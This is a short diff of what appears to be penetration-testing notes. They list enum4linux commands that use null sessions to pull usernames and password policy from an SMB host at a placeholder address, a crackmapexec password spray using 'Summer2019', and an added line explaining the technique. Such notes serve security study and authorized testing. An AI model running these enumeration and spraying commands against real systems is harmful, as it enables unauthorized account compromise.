@@ -7,3 +7,5 @@ enum4linux -U 192.168.x.x
 enum4linux -P 192.168.x.x
 4) Password Spray Usernames
 cme smb 192.168.x.x -u users.txt -p Summer2019
+
+[I'm not following. I'm using Null sessions to extract usernames and password policy. Then crackmapexec to log all those users in at once with the password "Summer2019".]
